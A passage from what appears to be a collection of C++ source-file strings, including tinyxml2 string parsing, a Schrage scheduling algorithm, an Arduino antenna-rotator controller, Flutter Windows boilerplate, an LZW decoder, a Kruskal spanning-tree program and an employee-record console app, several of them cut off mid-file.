if ( _flags & NEEDS_DELETE ) {\n        delete [] _start;\n    }\n    _flags = 0;\n    _start = 0;\n    _end = 0;\n}\n\n\nvoid StrPair::SetStr( const char* str, int flags )\n{\n    Reset();\n    size_t len = strlen( str );\n    _start = new char[ len+1 ];\n    memcpy( _start, str, len+1 );\n    _end = _start + len;\n    _flags = flags | NEEDS_DELETE;\n}\n\n\nchar* StrPair::ParseText( char* p, const char* endTag, int strFlags )\n{\n    TIXMLASSERT( endTag && *endTag );\n\n    char* start = p;\t// fixme: hides a member\n    char  endChar = *endTag;\n    size_t length = strlen( endTag );\n\n    // Inner loop of text parsing.\n    while ( *p ) {\n        if ( *p == endChar && strncmp( p, endTag, length ) == 0 ) {\n            Set( start, p, strFlags );\n            return p + length;\n        }\n        ++p;\n    }\n    return 0;\n}\n\n\nchar* StrPair::ParseName( char* p )\n{\n    char* start = p;\n\n    if ( !start || !(*start) ) {\n        return 0;\n    }\n\n    while( *p && ( p == start ? XMLUtil::IsNameStartChar( *p ) : XMLUtil::IsNameChar( *p ) )) {\n        ++p;\n    }\n\n    if ( p > start ) {\n        Set( start, p, 0 );\n        return p;\n    }\n    return 0;\n}\n\n\nvoid StrPair::CollapseWhitespace()\n{\n    // Trim leading space.\n    _start = XMLUtil::SkipWhiteSpace( _start );\n\n    if ( _start && *_start ) {\n        char* p = _start;\t// the read pointer\n        char* q = _start;\t// the write pointer\n\n        while( *p ) {\n            if ( XMLUtil::IsWhiteSpace( *p )) {\n                p = XMLUtil::SkipWhiteSpace( p );\n                if ( *p == 0 ) {\n                    break;    // don't write to q; this trims the trailing space.\n                }\n                *q = ' ';\n                ++q;\n            }\n            *q = *p;\n            ++q;\n            ++p;\n        }\n        *q = 0;\n    }\n}\n\n\nconst char* StrPair::GetStr()\n{\n    if ( _flags & NEEDS_FLUSH ) {\n        *_end = 0;\n        _flags ^= NEEDS_FLUSH;\n\n        if ( _flags ) {\n            char* p = _start;\t// the read pointer\n            char* q = _start;\t// the write pointer\n\n            while( p < _end ) {\n                if ( (_flags & NEEDS_NEWLINE_NORMALIZATION) && *p == CR ) {\n                    // CR-LF pair becomes LF\n                    // CR alone becomes LF\n                    // LF-CR becomes LF\n                    if ( *(p+1) == LF ) {\n                        p += 2;\n                    }\n                    else {\n                        ++p;\n                    }\n                    *q++ = LF;\n                }\n                else if ( (_flags & ",
    "#include <iostream>\n#include<fstream>\n#include <string>\n\n\n\n/**\n * @brief struktura zadania\n *  ID Numer identyfikacyjny zadania\n    r: Czas pojawienia si\u0119 zadania \n    p: Czas przetwarzania zadania\n    q: Termin wykonania zadania\n * \n */\nstruct task\n{\n  public:\n    int ID;\n    int r;\n    int p;\n    int q;\n};\n\n/**\n * @brief funkcja zamienia miejscami pola dwoch obiektow typu task\n * \n * @param a zadanie a\n * @param b zadanie b\n */\nvoid task_swap(task& a, task& b)\n{\n  std::swap(a.ID, b.ID);\n  std::swap(a.p, b.p);\n  std::swap(a.q, b.q);\n  std::swap(a.r, b.r);\n}\n\n/**\n * @brief Implementuje algorytm Schrage\n * \n * @param n liczba zadan\n * @param T tablica zadan \n * @param X tablica kolejnosci\n * @return int cmax\n */\nint schrage(int n, task* T, int* X)\n{\n  int ND[100], D[100];\t\t\t\t\t\t\t//ND - tablica zada\u0144 niedost\u0119pnych  D - tablica zada\u0144 dost\u0119pnych\n  int nd = n, d = 0, w = 0;\t\t// nd - liczba zada\u0144 niedost\u0119pnych  d-tablica zada\u0144 dost\u0119pnych  w-liczba zada\u0144 wykonanych \n  int  t = 0, cmax = 0;\t\t\t//t - obecna jednostka czasu  cmax-d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego uszeregowania\n  for (int i = 0; i < n; i++)\n  {\n    ND[i] = i;\n  }\n  for (int i = 0; i < n - 1; i++)\t\t\t//sortowanie tablicy zada\u0144 niedost\u0119nych malej\u0105co po r\n  {\n    for (int j = 0; j < n - 1; j++)\n    {\n      if (T[ND[j]].r < T[ND[j + 1]].r)\n      {\n        std::swap(ND[j], ND[j + 1]);\n      }\n    }\n  }\n  while (w != n)\t\t\t\t\t//je\u015bli s\u0105 zadania niewykonane\n  {\n    if (nd != 0)\t\t\t\t//je\u015bli s\u0105 jeszcze zadania niedost\u0119pne\n    {\t\n      if (T[ND[nd - 1]].r <= t)\t\t//je\u015bli jest jakie\u015b task kt\u00f3re przysz\u0142o\n      {\n        D[d] = ND[nd - 1];\n        d++;\n        nd--;\n        for (int k = d - 1; k > 0; k--)\t\t\t//sortowanie tablicy zada\u0144 dost\u0119pnych rosn\u0105co po q\n        {\n          if (T[D[k]].q < T[D[k - 1]].q)\n          {\n            std::swap(D[k], D[k - 1]);\n          }\n        }\n        continue;\n      }\n    }\n    if (d != 0)\t\t\t//je\u015bli s\u0105 zadania dost\u0119pne\n    {\n      X[w] = D[d - 1];\n      t += T[X[w]].p;\n      cmax = std::max(cmax, t + T[X[w]].q);\n      d--;\n      w++;\n      continue;\n    }\n    if (d == 0 && T[ND[nd - 1]].r > t)\t\t\t//je\u015bli jest jakia\u015b przerwa w pracy to j\u0105 przeskocz\n    {\n      t = T[ND[nd - 1]].r;\n    }\n  }\n  return cmax;\n}\n\n\n/**\n * @brief \n * \n * @param n \n * @param T \n * @return int \n */\nint schrage_divide(int n, task* T)\n{\n  int ND[100];\n  int D[100];\n  int pom[100];\n  int nd = n;\n  int d = 0;\n  int  t = 0;\n  int cmax = 0;\n  int poz = 100;\n  int ile_zr = 0;\n  for (int i = 0; i < n; i++)\n  {\n    pom[i] = T[i].p;\n  }\n  for (int i = 0; i < n; i++)\n  {\n    ND[i] = i;\n  }\n  for (int i = 0; i < n - 1; i++)\t\t\t\n  {\n    for (int j = 0; j < n - 1; j++)\n    {\n      if (T[ND[j]].r < T[ND[j + 1]].r)\n      {\n        std::swap(ND[j], ND[j + 1]);\n      }\n    }\n  }\n  while (nd != 0 || d != 0)  \n  {\n    if (nd != 0) // dopoki sa dostepne zadania\n    {\n      if (T[ND[nd-1]].r <= t) // sprawdza czy mozna zaplanowac zadanie\n      {\n        D[d] = ND[nd - 1];\n        d++;\n        nd--;\n        for (int k = d - 1; k > 0; k--)\t\t\t\n        {\n          if (T[D[k]].q < T[D[k - 1]].q)\n          {\n            std::swap(D[k], D[k - 1]);\n          }\n        }\n        if (poz != 100)\n        {\n          if (T[D[d - 1]].q > T[poz].q)\n          {\n            D[d] = poz;\n            std::swap(D[d], D[d - 1]);\n            d++;\t\t\t\t\t\t\n            poz = 100;\n          }\n        }\n        continue;\n      }\n    }\n    if (d != 0)\n    {\n      if (poz == 100)\n      {\n        poz = D[d - 1];\n        d--;\n      }\n      if (nd != 0)\n      {\n        ile_zr = std::min(pom[poz], T[ND[nd - 1]].r - t);\n      }\n      else\n      {\n        ile_zr = pom[poz];\n      }\n      t += ile_zr;\n      pom[poz] -= ile_zr;\n      if (pom[poz]== 0)\n      {\n        cmax = std::max(cmax, t + T[poz].q);\n        poz = 100;\n      }\n      continue;\n    }\n    if (d == 0 && nd != 0)\n    {\n      if (T[ND[nd - 1]].r > t)\n      {\n        t = T[ND[nd - 1]].r;\n      }\n    }\n  }\n  return cmax;\n}\nint main()\n{\n  int X[100];\n  task T[100];\n  std::string s = \"data.00\", s1, s2;\n  std::ifstream f(\"data.txt\");\n  int n;\n  for (int i = 0; i < 9; i++)\t\t\t//p\u0119tla przechodz\u0105ca przez ka\u017cdy zbi\u00f3r danych\n  {\n    s1 = s + std::to_string(i) + \":\";\n    while (s2 != s1)\t\t\t\t//szukanie odpowiedniego zbioru danych\n    {\n      f >> s2;\n    }\n    f >> n;\t\t\t\t\t\t\t//wczytywanie ilo\u015bci zada\u0144 w danym zbiorze danych\n    for (int j = 0; j < n; j++)\t\t//wczytywanie parametr\u00f3w kolejnych zada\u0144\n    {\n      T[j].ID = j;\n      f >> T[j].r >> T[j].p >> T[j].q;\n    }\n    std::cout << \"| \" << s1 << std::endl;\n    std::cout << \"| Podzial: \" << schrage_divide(n, T) << std::endl;\n    std::cout << \"| Schrage: \" << schrage(n, T, X) << std::endl;\n    std::cout << \"| Roznica: \" << schrage(n, T, X) - schrage_divide(n, T) << std::endl;\n    for (int i = 0; i < n; i++)\n    {\n      std::cout << X[i]+1 << \" \";\n    }\n    std::cout <<std::endl<< \"===========================================\" <<std::endl;\n  }\n}\n",
    "//ADD ACCEL/DECEL\n//ADD SPEED POT\n//ADD EL\n\n#include <Arduino.h>\n#include <U8g2lib.h>\n#include <Encoder.h>\n\n/*\n#define button_park 40\n*/\n\n#define homeAzPosition 55\n#define homeElPosition 0\n\n#define leftButtonPin 32\n#define rightButtonPin 33\n#define leftOutputPin 6\n#define rightOutputPin 7\n#define encAzPinA 3\n#define encAzPinB 21\n#define azPPDeg 5.33333\n\n#define azSpeedPin 54\n#define azSpeedMin 25\n#define azSpeedInc 4\n#define azSpeedDec 10\n#define azSpeedInterval 50\n\n#define encElPinA 19\n#define encElPinB 18\n#define upButtonPin 34\n#define downButtonPin 35\n#define upOutputPin 8\n#define downOutputPin 9\n#define elPPDeg 4\n\n#define elSpeedPin 53\n#define elSpeedMin 25\n#define elSpeedInc 10\n#define elSpeedDec 10\n#define elSpeedInterval 50\n\nunsigned long azSpeedStart = millis();\nunsigned long elSpeedStart = millis();\n\nEncoder AzEncoder(encAzPinA, encAzPinB);\nEncoder ElEncoder(encElPinA, encElPinB);\n\nU8G2_SSD1309_128X64_NONAME0_F_4W_SW_SPI displayLCD(U8G2_R0, /* clock=*/ 52, /* data=*/ 50, /* cs=*/ 49, /* dc=*/ 53, /* reset=*/ 51);  \n\nfloat currentAz = -100;\nfloat currentEl = -100;\n\nint azSpeedMax = 255;\nint azSpeedLeft = 0;\nint azSpeedRight = 0;\n\nint elSpeedMax = 255;\nint elSpeedUp = 0;\nint elSpeedDown = 0;\n\nvoid updateDisplay();\nvoid checkAzEl();\n\nvoid setup() {\n  Serial.begin(9600);\n\n  pinMode(leftButtonPin, INPUT);\n  pinMode(rightButtonPin, INPUT);\n  pinMode(leftButtonPin, INPUT_PULLUP);\n  pinMode(rightButtonPin, INPUT_PULLUP);\n\n  pinMode(leftOutputPin, OUTPUT);  \n  pinMode(rightOutputPin, OUTPUT);\n  analogWrite(leftOutputPin, azSpeedLeft);\n  analogWrite(rightOutputPin, azSpeedRight);\n\n  pinMode(upButtonPin, INPUT);\n  pinMode(downButtonPin, INPUT);\n  pinMode(upButtonPin, INPUT_PULLUP);\n  pinMode(downButtonPin, INPUT_PULLUP);\n\n  pinMode(upOutputPin, OUTPUT);\n  pinMode(downOutputPin, OUTPUT);\n  analogWrite(upOutputPin, elSpeedUp);\n  analogWrite(downOutputPin, elSpeedDown);\n\n  displayLCD.begin();\n\n  updateDisplay();\n}\nvoid loop() {\n\n  if(millis() - azSpeedStart >= azSpeedInterval){ //Az Button Stuff\n    //int tempAzSpeedMax = map(analogRead(azSpeedPin),0,1020,azSpeedMin,255);\n    int tempAzSpeedMax = 255;\n    \n    if(tempAzSpeedMax < azSpeedMax)azSpeedMax -= azSpeedDec;\n    else azSpeedMax = tempAzSpeedMax;\n\n    if(!digitalRead(leftButtonPin) && azSpeedRight == 0){\n      if(azSpeedLeft == 0)azSpeedLeft = azSpeedMin;\n      \n      azSpeedLeft += azSpeedInc;\n      if(azSpeedLeft > azSpeedMax)azSpeedLeft = azSpeedMax;\n    }\n    else{\n      azSpeedLeft -= azSpeedDec;\n      if(azSpeedLeft != 0 && azSpeedLeft < azSpeedMin) azSpeedLeft = 0;\n    }\n  \n    if(!digitalRead(rightButtonPin) && azSpeedLeft == 0){\n      if(azSpeedRight == 0)azSpeedRight = azSpeedMin;\n\n      azSpeedRight += azSpeedInc;\n      if(azSpeedRight > azSpeedMax)azSpeedRight = azSpeedMax;\n    }\n  else{\n    azSpeedRight -= azSpeedDec;\n    if(azSpeedRight != 0 && azSpeedRight < azSpeedMin) azSpeedRight = 0;\n  }\n\n  azSpeedStart = millis();\n\n  analogWrite(leftOutputPin, azSpeedLeft);\n  analogWrite(rightOutputPin, azSpeedRight);\n  }\n\n  if(millis() - elSpeedStart >= elSpeedInterval){ //Az Button Stuff\n    //int tempAzSpeedMax = map(analogRead(azSpeedPin),0,1020,azSpeedMin,255);\n    int tempElSpeedMax = 255;\n    \n    if(tempElSpeedMax < elSpeedMax)elSpeedMax -= elSpeedDec;\n    else elSpeedMax = tempElSpeedMax;\n\n    if(!digitalRead(upButtonPin) && elSpeedDown == 0){\n      if(elSpeedUp == 0)elSpeedUp = elSpeedMin;\n      \n      elSpeedUp += elSpeedInc;\n      if(elSpeedUp > elSpeedMax)elSpeedUp = elSpeedMax;\n    }\n    else{\n      elSpeedUp -= elSpeedDec;\n      if(elSpeedUp != 0 && elSpeedUp < elSpeedMin) elSpeedUp = 0;\n    }\n  \n    if(!digitalRead(downButtonPin) && elSpeedUp == 0){\n      if(elSpeedDown == 0)elSpeedDown = elSpeedMin;\n\n      elSpeedDown += elSpeedInc;\n      if(elSpeedDown > elSpeedMax)elSpeedDown = elSpeedMax;\n    }\n  else{\n    elSpeedDown -= elSpeedDec;\n    if(elSpeedDown != 0 && elSpeedDown < elSpeedMin) elSpeedDown = 0;\n  }\n\n  elSpeedStart = millis();\n\n  analogWrite(downOutputPin, elSpeedDown);\n  analogWrite(upOutputPin, elSpeedUp);\n  }\n\n  checkAzEl();\n}\nvoid checkAzEl(){\n  float tempAz = AzEncoder.read(); tempAz /= azPPDeg;\n  float tempEl = ElEncoder.read(); tempEl /= elPPDeg;\n  \n  tempAz += homeAzPosition;\n\n  if(tempAz < 0)tempAz += 360;\n  else if(tempAz > 360) tempAz -= 360;\n  /*if(tempEl < 0){\n    ElEncoder.write(0);\n    tempEl = 0;\n  }\n  else if(tempEl > 90){\n    ElEncoder.write(360);\n    tempEl = 90;\n  }*/\n\n  if(tempAz != currentAz){\n    currentAz = tempAz;\n    updateDisplay();\n  }\n\n  if(tempEl != currentEl){\n    currentEl = tempEl;\n    updateDisplay();\n  }\n}\nvoid updateDisplay(){\n  \n  displayLCD.setFontMode(1); \n  displayLCD.setDrawColor(1);\n  displayLCD.setFont(u8g2_font_osr26_tn);\n  displayLCD.clearBuffer();\n\n  if(currentAz >= 0 && currentAz < 10){displayLCD.setCursor(38,25);}\n  else if(currentAz >= 10 && currentAz < 100){displayLCD.setCursor(28,25);}\n  else{displayLCD.setCursor(17,25);}\n  displayLCD.print(currentAz,1);\n\n  if(currentEl <= -10",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"listview_gridciew\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <unordered_map>\n#include <string>\n#include <cstdint>\n#include <chrono> \n#include <unordered_set>\n    // auto start = std::chrono::high_resolution_clock::now();\n    // auto stop = std::chrono::high_resolution_clock::now();\n    // auto duration2 = std::chrono::duration<double, std::milli>(stop-start);\n    // std::cout << \"time while file: \" << duration2.count() << std::endl;\n\n\n\nbool MSB_isOne(char &value) {\n    // 1 << 7 -> 10000000\n    return value & (1 << 7);\n}\n\n\nint main(int argc, char* argv[]) {\n\n    // Check #no provided args is correct\n    if (argc != 3) {\n        std::cout << \"Please only provide two args: input_file_path & output_file_path\" << std::endl;\n        return 1; \n    }\n\n    // Use (var & MSB) to flip MSB of value to 0; defined once to avoid redundancy\n    uint8_t msb = 0; // 0000\n    msb -= 1; // 1111\n    msb >>= 1; // 0111\n\n\n    std::ifstream inFile(argv[1], std::ios::binary | std::ios::app);\n\n    // Clear this later\n    std::ofstream out;\n    out.open(argv[2], std::ofstream::out | std::ofstream::trunc);\n    out.close();\n    //\n\n    std::ofstream outFile(argv[2], std::ios::binary | std::ios::app);\n\n    // Check files opens correctly\n    if (!inFile || !outFile )\n    {\n        std::cout << \"Unable to open or write to File.\" << std::endl;\n    }\n\n\n    if(inFile.is_open() && outFile.is_open()) {\n        \n        char c; \n        std::string p = \"\";\n        std::unordered_map<uint16_t, std::string> codeDict;\n        std::unordered_set<std::string> codeSet;\n        uint16_t index = 0;\n\n        inFile.get(c);\n        outFile.write(reinterpret_cast<const char*>(&c), sizeof(c)); \n        p = c;\n        while(inFile.get(c)) {\n                    std::cout << c << std::endl;\n\n            // Following 8 bits represent an ASCII char\n            if (!MSB_isOne(c)) {\n\n                if (codeSet.find(p+c) == codeSet.end()) {\n\n                    codeDict[index++] = p+c;\n                    codeSet.insert(p+c);\n                    p = c; \n\n                } else {        // If the concat. string is in the dict, we compound to get next dict entry\n                    p = p+c;\n                }\n                outFile.write(reinterpret_cast<const char*>(&c), sizeof(c)); \n\n             // Following 16 bits represent an index\n            } else { \n\n                uint8_t hiByte = c & msb;\n                inFile.get(c);\n                uint8_t loByte = c;\n                uint16_t reqIndex = (hiByte << 8) | loByte;\n\n                if (codeDict.find(reqIndex) != codeDict.end()) {\n\n                    for (const auto& ch : codeDict[reqIndex]) {\n                        outFile.write(reinterpret_cast<const char*>(&ch), sizeof(ch)); \n                    }\n\n                    if (codeSet.find(p+codeDict[reqIndex][0]) == codeSet.end()) {\n                        codeDict[index++] = p+codeDict[reqIndex][0];\n                        codeSet.insert(p+codeDict[reqIndex][0]);\n                    }\n\n                // Special case: If the index hasn't been encountered yet, we return p + p[0]\n                // Occurs when string concat occurs consecutively when encoding                \n                } else {\n                    \n                    for (const auto& ch : p) {\n                        outFile.write(reinterpret_cast<const char*>(&ch), sizeof(ch)); \n                    }\n                    outFile.write(reinterpret_cast<const char*>(&p[0]), sizeof(p[0])); \n\n                    codeDict[index++] = p + p[0];\n                    codeSet.insert(p + p[0]);\n                }\n\n                p = codeDict[reqIndex];\n                \n            }\n\n        }  \n \n        inFile.close();\n        outFile.close();\n    }\n\n\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <algorithm>\n#include <string>\n\nusing namespace std;\n\nclass Arete {\npublic:\n    int src, dest, poids;\n\n    Arete(int src, int dest, int poids) {\n        this->src = src;\n        this->dest = dest;\n        this->poids = poids;\n    }\n};\n\nclass Graphe {\npublic:\n    int V, E;\n    vector<string> MST;\n    vector<Arete> aretes;\n\n    Graphe(int V, int E) {\n        this->V = V;\n        this->E = E;\n    }\n\n    void ajouterArete(int src, int dest, int poids) {\n        Arete arete(src, dest, poids);\n        aretes.push_back(arete);\n    }\n    \n    int trouver(vector<int>& parent, int i) {\n        if (parent[i] == -1)\n            return i;\n        return trouver(parent, parent[i]);\n    }\n    \n    void kruskalMST() {\n        vector<int> parent(V, -1);        \n        sort(aretes.begin(), aretes.end(), [](Arete a, Arete b) {\n            return a.poids < b.poids;\n            });\n\n        for (Arete arete : aretes) {\n            int x = trouver(parent, arete.src);\n            int y = trouver(parent, arete.dest);            \n            \n            if (x != y) {\n                cout << arete.src << \" - \" << arete.dest << \" : \" << arete.poids << endl;\n                MST.push_back( \"(\" + to_string(arete.src) + \", \" + to_string(arete.dest) + \", \" + to_string(arete.poids) + \"),\\n\");\n                parent[x] = y;\n            }\n        }\n    }\n\n    void exporter_Kruskal() {\n\n        ofstream outputFile(\"C:/Users/RENTO/Desktop/Recherche_Op\u00e9rationnelle/Kruskal_data.txt\");\n\n        if (outputFile.is_open()) {\n\n            outputFile << \"[\" << endl;\n            for (Arete arete : aretes) {\n                outputFile << \"(\" << arete.src << \", \" << arete.dest << \", \" << arete.poids << \"),\" << endl;\n            }\n            outputFile << \"]\" << endl;\n\n            outputFile.close();\n            cout << \"Exportation de Kruskal reussie\" << endl;\n        }\n        else {\n            cout << \"Echec d'acces au fichier\" << endl;\n        }\n    }\n\n    void exporter_Kruskal_MST() {\n\n        ofstream outputFile(\"C:/Users/RENTO/Desktop/Recherche_Op\u00e9rationnelle/Kruskal_MST.txt\");\n\n        if (outputFile.is_open()) {\n\n            outputFile << \"[\" << endl;\n            for (string var : MST)\n            {\n                outputFile << var;\n            }            \n            outputFile << \"]\" << endl;\n\n            outputFile.close();\n            cout << \"Exportation de Kruskal MST reussie\" << endl;\n        }\n        else {\n            cout << \"Echec d'acces au fichier\" << endl;\n        }\n    }\n};\n\n\nvoid Dessiner() {\n    string pythonScriptPath = \"C:/Users/RENTO/Desktop/Recherche_Op\u00e9rationnelle/Kruskal_Draw.py\";\n\n    string command = \"python \" + pythonScriptPath;\n\n    int result = system(command.c_str());\n\n    if (result == 0) {\n        cout << \"Les graphes ont ete dessines avec succes.\";\n    }\n    else {\n        cout << \"Erreur d'execution\";\n    }\n}\n\nint main() {\n    Graphe graphe(5, 5);\n    \n    graphe.ajouterArete(0, 1, 6);\n    graphe.ajouterArete(1, 2, 5);\n    graphe.ajouterArete(0, 2, 8);\n    graphe.ajouterArete(2, 3, 1);\n    graphe.ajouterArete(3, 4, 2);\n\n    graphe.exporter_Kruskal();\n\n    cout << \"Arbre couvrant minimal de Kruskal :\" << endl;\n    graphe.kruskalMST();\n    graphe.exporter_Kruskal_MST();\n    Dessiner();\n\n\n    /*\n    int nbrSommet, nbrArret;\n    cout << \"Entrez le nombre de sommets : \" << endl;\n    cin >> nbrSommet;\n    cout << \"Entrez le nombre d'arrets : \" << endl;\n    cin >> nbrArret;\n\n    Graphe graphe1(nbrSommet, nbrArret);\n    int dep, dest, poids;\n    for (int i = 0;i < nbrArret;i++) {\n        cout << \"Entrez le sommet de depart / destination / poids : \" << endl;\n        cin >> dep >> dest >> poids;\n        graphe1.ajouterArete(dep, dest, poids);\n    }\n    */\n\n    return 0;\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\n// Define a struct for Employee\nstruct Employee {\n    int id;\n    string name;\n    double salary;\n};\n\n// Function to add a new employee\nvoid addEmployee(vector<Employee>& employees) {\n    Employee newEmployee;\n    \n    cout << \"---------------------\\nEnter employee ID: \";\n    cin >> newEmployee.id;\n    \n    // Check if an employee with the same ID already exists\n    for (const Employee& emp : employees) {\n        if (emp.id == newEmployee.id) {\n            cout << \"Employee with ID \" << newEmployee.id << \" already exists. Please enter a different ID.\\n---------------------\" << endl;\n            return; // Exit the function without adding the employee\n        }\n    }\n    \n    cout << \"Enter employee name: \";\n    cin.ignore(); // Clearing input buffer \n    getline(cin, newEmployee.name);\n    \n    cout << \"Enter employee salary: $\";\n    cin >> newEmployee.salary;\n    \n    employees.push_back(newEmployee);\n    \n    cout << \"Employee added successfully!\\n---------------------\" << endl;\n}\n\n// Function to print all employee information\nvoid printAllEmployees(const vector<Employee>& employees) {\n    cout << \"---------------------\\nList of Employees:\" << endl;\n    for (const Employee& emp : employees) {\n        cout << \"ID: \" << emp.id << \", Name: \" << emp.name << \", Salary: $\" << emp.salary << endl;\n    }\n    cout << \"---------------------\\n\";\n}\n\n// Function to print salary by employee ID\nvoid printEmployeeSalary(const vector<Employee>& employees, int id) {\n    bool found = false;\n    for (const Employee& emp : employees) {\n        if (emp.id == id) {\n            cout << \"---------------------\\nEmployee ID: \" << emp.id << \", Salary: $\" << emp.salary << endl;\n            cout << \"---------------------\\n\";\n            found = true;\n            break;\n        }\n    }\n    if (!found) {\n        cout << \"Employee with ID \" << id << \" not found.\" << endl << \"---------------------\\n\";\n    }\n}\n\n// Function for employee payout\nvoid employeePayout(vector<Employee>& employees) {\n    int empId;\n    double bonus;\n\n    cout << \"---------------------\\nEnter employee ID: \";\n    cin >> empId;\n\n    bool found = false;\n    for (Employee& emp : employees) {\n        if (emp.id == empId) {\n            cout <<\"Employee name: \" << emp.name;\n            cout <<\"\\nEmployee salary: $\" << emp.salary;\n            cout << \"\\nEnter bonus for employee: $\";\n            cin >> bonus;\n            double totalPay = emp.salary + bonus;\n            cout << \"\\nTotal pay for \" << emp.name << \" is: $\" << totalPay << \"\\n---------------------\" << endl ;\n            found = true;\n            break;\n        }\n    }\n    if (!found) 